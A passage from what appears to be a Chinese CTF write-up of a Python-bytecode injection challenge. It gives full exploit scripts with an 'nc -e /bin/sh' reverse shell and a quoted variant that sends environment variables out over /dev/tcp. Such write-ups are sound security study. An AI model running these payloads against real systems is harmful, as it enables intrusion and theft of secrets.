<h4 id="Upload-exploit-bytecode-in-chunks"><a href="#Upload-exploit-bytecode-in-chunks" class="headerlink" title="Upload exploit bytecode in chunks"></a>Upload exploit bytecode in chunks</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">exp_bc = exp_bc.ljust(num_chunks*chunk_size, <span class="hljs-string">b&#x27;;&#x27;</span>)<br>exp_block = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp_bc), chunk_size):<br>    exp_block.append(exp_bc[i:i+chunk_size])<br>    upload_key(exp_block[-<span class="hljs-number">1</span>])<br></code></pre></div></td></tr></table></figure>

<p>把exp分成chunk上传到keys中后, 再上传多个limit_code作为plugin, 用于将每个key中的exp_bc附加到log(其实是<code>./plugins</code>)后面, 拼接成exp. </p>
<ul>
<li>要注意的是keys加入consts的时候是通过遍历dict来实现的, <del>所以consts顺序是字典序从大到小</del>.for遍历输出居然是按照<a target="_blank" rel="noopener" href="https://docs.python.org/3.10/library/stdtypes.html#dictionary-view-objects">加入的顺序</a>, 测试的时候是直接赋初值然后输出, 结果是字典序. 最后是plugin_log函数object. 这导致每个limit_code中msg的偏移都不一样, 但filename和raw是一样的. </li>
<li><del>也不对啊, <code>for k in entries</code>这样取出来的是字典中的tuple, 这一个tuple怎么load_const再decode?</del> </li>
</ul>
<blockquote>
<p>python不过关, 做题两行泪: <code>list(dict)</code><a target="_blank" rel="noopener" href="https://docs.python.org/3.11/library/stdtypes.html#mapping-types-dict">只会返回key</a>, 而<code>for k in dict</code>同理……….</p>
<blockquote>
<p><strong>iter(d)</strong>: Return an iterator over the keys of the dictionary. This is a shortcut for <code>iter(d.keys())</code>.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">&gt;&gt;&gt;d<br>&#123;<span class="hljs-string">&#x27;one&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;two&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;three&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;four&#x27;</span>: <span class="hljs-number">4</span>&#125;<br>&gt;&gt;&gt;<span class="hljs-built_in">list</span>(d)<br>[<span class="hljs-string">&#x27;one&#x27;</span>, <span class="hljs-string">&#x27;two&#x27;</span>, <span class="hljs-string">&#x27;three&#x27;</span>, <span class="hljs-string">&#x27;four&#x27;</span>]<br>&gt;&gt;&gt;<span class="hljs-built_in">list</span>(d.values())<br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br></code></pre></div></td></tr></table></figure>
</blockquote>
<h4 id="Upload-additional-consts-amp-construct-expl-amp"><a href="#Upload-additional-consts-amp-construct-expl-amp" class="headerlink" title="Upload additional consts &amp; construct ./expl &amp;"></a>Upload additional consts &amp; construct ./expl &amp;</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#used for plugins</span><br>upload_key(<span class="hljs-string">b&#x27;plugins/expl&#x27;</span>)<br><br><span class="hljs-comment">#exec plugins to store exp to plugins/expl</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    plugin(<span class="hljs-string">f&#x27;../plugins/<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>.encode())<br><br><span class="hljs-comment">#used for ./expl</span><br>ip = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>rev_port = <span class="hljs-number">5555</span><br>commmand = <span class="hljs-string">f&quot;nc <span class="hljs-subst">&#123;ip&#125;</span> <span class="hljs-subst">&#123;rev_port&#125;</span> -e /bin/sh&quot;</span>.ljust(chunk_size * <span class="hljs-number">3</span>, <span class="hljs-string">&quot; &quot;</span>)<br>upload_key(commmand[:chunk_size])<br>upload_key(commmand[chunk_size : <span class="hljs-number">2</span> * chunk_size])<br>upload_key(commmand[<span class="hljs-number">2</span> * chunk_size :])<br></code></pre></div></td></tr></table></figure>

<p>为什么两个upload中间夹个plugin在上面解释了. </p>
<h4 id="REVERSE-SHELL"><a href="#REVERSE-SHELL" class="headerlink" title="REVERSE SHELL"></a>REVERSE SHELL</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">rev_shl = listen(rev_port)<br>plugin(<span class="hljs-string">f&#x27;expl&#x27;</span>.ljust(<span class="hljs-number">12</span>, <span class="hljs-string">&#x27; &#x27;</span>).encode())<br>rev_shl.sendline(<span class="hljs-string">b&#x27;echo $flag&#x27;</span>)<br>flag = rev_shl.recvline(<span class="hljs-literal">False</span>)<br>log.success(flag)<br></code></pre></div></td></tr></table></figure>

<p>其实行不通, 不知道容器里面的程序要怎么连接到主机里已在监听的接口. 实际上还要一个公网IP才能反弹, 还没接触过. </p>
<p>本地是在container里面验证过了exp. </p>
<p>complete exp:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> dis<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">store</span>(<span class="hljs-params">key: <span class="hljs-built_in">bytes</span>, data: <span class="hljs-built_in">bytes</span></span>):</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(key) &lt;= <span class="hljs-number">12</span>, <span class="hljs-string">&#x27;store key len&#x27;</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> x: x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>, data.decode()))<br>               ) == <span class="hljs-built_in">len</span>(data) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;data has to be in hex format&quot;</span><br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">4444</span>)<br>    p.send(<span class="hljs-string">b&#x27;S&#x27;</span>)<br>    p.send(key)<br>    p.send(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(data)))<br>    p.send(data)<br>    p.recvuntil(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;key&#125;</span>\n&#x27;</span>.encode(), timeout=<span class="hljs-number">1</span>)<br>    p.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>():</span><br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">4444</span>)<br>    p.send(<span class="hljs-string">b&#x27;D&#x27;</span>)<br>    p.clean()<br>    p.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">plugin</span>(<span class="hljs-params">name</span>):</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(name) == <span class="hljs-number">12</span><br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">4444</span>)<br>    p.send(<span class="hljs-string">b&#x27;P&#x27;</span>)<br>    p.send(name)<br>    p.clean(timeout = <span class="hljs-number">0.3</span>)<br>    p.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_const</span>(<span class="hljs-params">idx</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([dis.opmap[<span class="hljs-string">&#x27;LOAD_CONST&#x27;</span>], idx])<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_name</span>(<span class="hljs-params">idx</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([dis.opmap[<span class="hljs-string">&#x27;LOAD_NAME&#x27;</span>], idx])<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_key</span>(<span class="hljs-params">key</span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(key, <span class="hljs-built_in">str</span>):<br>        key = key.encode()<br>    store(key, <span class="hljs-string">b&#x27;deadbeef&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_plugin_code</span>(<span class="hljs-params">msg_idx, func_idx, fn_idx, raw_idx</span>):</span><br>    log.success(<span class="hljs-string">f&#x27;four args: <span class="hljs-subst">&#123;msg_idx&#125;</span> <span class="hljs-subst">&#123;func_idx&#125;</span> <span class="hljs-subst">&#123;fn_idx&#125;</span> <span class="hljs-subst">&#123;raw_idx&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> (<br>        <span class="hljs-comment">#load seventh callable to plugin_log + unused 456</span><br>        load_const(func_idx) * <span class="hljs-number">4</span> +<br>        <span class="hljs-comment">#load top three args</span><br>        load_const(raw_idx) + load_const(fn_idx) + load_const(msg_idx) +<br>        <span class="hljs-comment">#call log()</span><br>        <span class="hljs-built_in">bytes</span>([dis.opmap[<span class="hljs-string">&#x27;WITH_EXCEPT_START&#x27;</span>], <span class="hljs-number">0x30</span>])<br>    )<br><br><span class="hljs-comment"># This is the index where we will later store the nc command</span><br>nc_index = <span class="hljs-number">55</span><br>co_names = [<span class="hljs-string">&quot;len&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>, <span class="hljs-string">&quot;print&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;decode&quot;</span>] <span class="hljs-comment">#, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;]</span><br>exploit_asm = [<br>    <span class="hljs-comment"># Get length of empty list to push 0 on the stack</span><br>    (<span class="hljs-string">&quot;BUILD_LIST&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Use NOP as arg to simplify compiler ?????what is nop?? 不就是压入了一个long类型的0吗, 这个指令不需要参数.</span><br>    (<span class="hljs-string">&quot;GET_LEN&quot;</span>, <span class="hljs-number">0x09</span>),<br>    <span class="hljs-comment"># Invoke print() to push None onto the stack</span><br>    (<span class="hljs-string">&quot;LOAD_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;print&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_FUNCTION&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Import os</span><br>    (<span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;os&quot;</span>)),<br>    <span class="hljs-comment"># Invoke os.system()</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;system&quot;</span>)),<br>    <span class="hljs-comment"># Decode first batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index),    <span class="hljs-comment">#load了一个string object, 所以可以在他之上调用decode函数.</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode second batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">1</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode third batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">2</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Concatenate the three strings</span><br>    (<span class="hljs-string">&quot;BUILD_STRING&quot;</span>, <span class="hljs-number">3</span>),<br>    <span class="hljs-comment"># Finaly invoke the nc command</span><br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">1</span>)<br>]<br><br>exp_bc = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> op, arg <span class="hljs-keyword">in</span> exploit_asm:<br>    exp_bc += <span class="hljs-built_in">bytes</span>([dis.opmap[op], arg])<br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> co_names:<br>    exp_bc += <span class="hljs-string">b&#x27;;&#x27;</span> + name.encode()<br>exp_bc += <span class="hljs-string">b&#x27;;&#x27;</span><br><br><span class="hljs-comment">#fill slots</span><br>chunk_size = <span class="hljs-number">12</span><br>num_chunks = <span class="hljs-built_in">len</span>(exp_bc) // chunk_size + <span class="hljs-number">1</span><br><span class="hljs-comment"># num_chunk is 6, limit_code is 6, total is 12, and plugin_log will be 13</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span> - num_chunks):<br>    upload_key(<span class="hljs-string">b&#x27;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;%d&#x27;</span> % (i+<span class="hljs-number">10</span>))<br><br><span class="hljs-comment">#upload limit_code as serveral plugins in data</span><br>func_idx = <span class="hljs-number">48</span>+<span class="hljs-number">6</span>+<span class="hljs-number">1</span><br>msg_idx = <span class="hljs-number">0x30</span><br>fn_idx = <span class="hljs-number">0x30</span>+<span class="hljs-number">6</span><br>raw_idx = <span class="hljs-number">0x30</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_chunks):<br>    bc = get_plugin_code(i+msg_idx, func_idx, fn_idx, raw_idx)<br>    store(<span class="hljs-string">b&#x27;../plugins/%d&#x27;</span> % i, bc)<br>dump()<br><br>exp_bc = exp_bc.ljust(num_chunks*chunk_size, <span class="hljs-string">b&#x27;;&#x27;</span>)<br>exp_block = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp_bc), chunk_size):<br>    exp_block.append(exp_bc[i:i+chunk_size])<br>    upload_key(exp_block[-<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;exp_block:&#x27;</span>)<br><span class="hljs-built_in">print</span>(exp_block)<br><br><span class="hljs-comment">#fn_idx</span><br>upload_key(<span class="hljs-string">b&#x27;plugins/expl&#x27;</span>)<br><br><span class="hljs-comment">#exec plugins to store exp to plugins/expl</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    plugin(<span class="hljs-string">f&#x27;../plugins/<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>.encode())<br><br>ip = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>rev_port = <span class="hljs-number">5555</span><br>commmand = <span class="hljs-string">f&quot;nc <span class="hljs-subst">&#123;ip&#125;</span> <span class="hljs-subst">&#123;rev_port&#125;</span> -e /bin/sh&quot;</span>.ljust(chunk_size * <span class="hljs-number">3</span>, <span class="hljs-string">&quot; &quot;</span>)<br>upload_key(commmand[:chunk_size])<br>upload_key(commmand[chunk_size : <span class="hljs-number">2</span> * chunk_size])<br>upload_key(commmand[<span class="hljs-number">2</span> * chunk_size :])<br><br><span class="hljs-comment"># rev_shl = listen(rev_port)</span><br>plugin(<span class="hljs-string">f&#x27;expl&#x27;</span>.ljust(<span class="hljs-number">12</span>, <span class="hljs-string">&#x27; &#x27;</span>).encode())<br><span class="hljs-comment"># rev_shl.sendline(b&#x27;echo $flag&#x27;)</span><br><span class="hljs-comment"># flag = rev_shl.recvline(False)</span><br><span class="hljs-comment"># log.success(flag)</span><br></code></pre></div></td></tr></table></figure>

<h4 id="其实还是复杂了"><a href="#其实还是复杂了" class="headerlink" title="其实还是复杂了"></a>其实还是复杂了</h4><p><a target="_blank" rel="noopener" href="https://ptr-yudai.hatenablog.com/entry/2022/11/06/163123#Pwn-Pasta-Ordersystem-%EF%B8%8F-14-solves--343-pts">writeup3</a> </p>
<p>这篇wp使用的方法是用<code>eval()</code>来解析反弹shell命令, 而从consts加载的命令字符串可直接使用<code>BINARY_ADD</code>指令来拼接(当然<code>BUILD_STRING</code>感觉更好). 在exp_bc后面加上了return语句, (应该)可以避免unknown opcode的报错. </p>
<p>并没有把多个写入操作分成多个文件, 而是</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ptrlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_conn</span>():</span><br>    <span class="hljs-keyword">return</span> Socket(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">4444</span>)<br>    <span class="hljs-comment">#return Socket(&quot;23.88.100.81&quot;, 44463)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">store</span>(<span class="hljs-params">entry, data</span>):</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(entry) &lt;= <span class="hljs-number">12</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x80</span><br>    sock = make_conn()<br>    sock.send(<span class="hljs-string">&#x27;S&#x27;</span>)<br>    sock.send(entry + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">12</span> - <span class="hljs-built_in">len</span>(entry)))<br>    sock.send(<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">len</span>(data) * <span class="hljs-number">2</span>]))<br>    sock.send(data.<span class="hljs-built_in">hex</span>())<br>    <span class="hljs-built_in">print</span>(sock.recvline())<br>    sock.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>():</span><br>    sock = make_conn()<br>    sock.send(<span class="hljs-string">&#x27;D&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(sock.recv())<br>    sock.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">plugin</span>(<span class="hljs-params">name</span>):</span><br>    sock = make_conn()<br>    sock.send(<span class="hljs-string">&#x27;P&#x27;</span>)<br>    sock.send(name + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">12</span> - <span class="hljs-built_in">len</span>(name)))<br>    sock.close()<br><span class="hljs-comment"># &#x27;/&#x27; is not valid as filename so use \x2f instead</span><br>pycode = <span class="hljs-string">b&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;env &gt; \\x2fdev\\x2ftcp\\x2f&lt;HOST&gt;\\x2f&lt;PORT&gt;\&quot;&#x27;)&quot;</span><br>pychunks = chunks(pycode, <span class="hljs-number">12</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>code = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">116</span>,<span class="hljs-number">0x00</span>, <span class="hljs-comment"># LOAD_GLOBAL (eval)</span><br>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(pychunks)):<br>    code += <span class="hljs-built_in">bytes</span>([<span class="hljs-number">100</span>,i])  <span class="hljs-comment"># LOAD_CONST</span><br>    <span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">0</span>:<br>        code += <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x17</span>,<span class="hljs-number">0x00</span>]) <span class="hljs-comment"># BINARY_ADD</span><br>code += <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0x09</span>,<span class="hljs-number">0xc2</span>,  <span class="hljs-comment"># NOP</span><br>    <span class="hljs-number">0x83</span>,<span class="hljs-number">0x01</span>, <span class="hljs-comment"># LOAD_METHOD (eval) 这是什么东西, 明明是CALL_FUNCTION</span><br>    <span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>, <span class="hljs-comment"># POP_TOP</span><br>    <span class="hljs-number">100</span>,<span class="hljs-number">0x00</span>, <span class="hljs-comment"># LOAD_CONST (None)</span><br>    <span class="hljs-number">83</span>,<span class="hljs-number">0x00</span>, <span class="hljs-comment"># RETURN_VALUE</span><br>])<br>data = code + <span class="hljs-string">b&quot;;eval;&quot;</span><br>blocks = chunks(data, <span class="hljs-number">12</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pos_func = <span class="hljs-number">0x33</span> + <span class="hljs-built_in">len</span>(blocks)<br>code = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(blocks)):<br>    code += <span class="hljs-built_in">bytes</span>([<br>        <span class="hljs-number">100</span>,pos_func, <span class="hljs-number">100</span>,<span class="hljs-number">0x30</span>, <span class="hljs-number">100</span>,<span class="hljs-number">0x30</span>, <span class="hljs-number">100</span>,<span class="hljs-number">0x30</span>, <span class="hljs-comment"># func</span><br>        <span class="hljs-number">100</span>,<span class="hljs-number">0x30</span>, <span class="hljs-number">100</span>,<span class="hljs-number">0x32</span>, <span class="hljs-number">100</span>,<span class="hljs-number">0x33</span>+i, <span class="hljs-comment"># raw, filename, msg</span><br>        <span class="hljs-number">49</span>, <span class="hljs-number">0x30</span>, <span class="hljs-comment"># call by exception</span><br>    ])<br>code += <span class="hljs-built_in">bytes</span>([<span class="hljs-number">53</span>,<span class="hljs-number">53</span>])<br><span class="hljs-keyword">for</span> piece <span class="hljs-keyword">in</span> pychunks:<br>    store(piece, <span class="hljs-string">b&quot;whatever&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span> - <span class="hljs-built_in">len</span>(pychunks)):<br>    store(<span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x41</span> + i] * <span class="hljs-number">12</span>), <span class="hljs-string">b&quot;whatever&quot;</span>)<br>store(<span class="hljs-string">b&quot;../plugins/A&quot;</span>, <span class="hljs-built_in">bytes</span>.fromhex(code.decode()))<br>store(<span class="hljs-string">b&quot;\x00&quot;</span>, <span class="hljs-string">b&quot;whatever&quot;</span>) <span class="hljs-comment"># stop</span><br>store(<span class="hljs-string">b&quot;.//plugins/B&quot;</span>, <span class="hljs-string">b&quot;whatever&quot;</span>) <span class="hljs-comment"># filename</span><br><span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>    store(block, <span class="hljs-string">b&quot;whatever&quot;</span>) <span class="hljs-comment"># data</span><br><span class="hljs-comment"># write ascii bytecode</span><br>dump()<br>time.sleep(<span class="hljs-number">0.1</span>)<br>plugin(<span class="hljs-string">b&quot;0123456789/A&quot;</span>)<br><span class="hljs-comment"># win!</span><br>time.sleep(<span class="hljs-number">0.1</span>)<br>plugin(<span class="hljs-string">b&quot;0123456789/B&quot;</span>)<br></code></pre></div></td></tr></table></figure>

<h2 id="RIOT"><a href="#RIOT" class="headerlink" title="RIOT"></a>RIOT</h2><p>RIOT src <a target="_blank" rel="noopener" href="https://github.com/RIOT-OS/RIOT/blob/a21f05aeffd9fdf0e61026d85b465c652a9cf8c9/drivers/ethos/ethos.c#L379">off-by-one</a> </p>
<ul>
<li></li>
<li></li>
</ul>
<h2 id="placemat"><a href="#placemat" class="headerlink" title="placemat"></a>placemat</h2><ul>
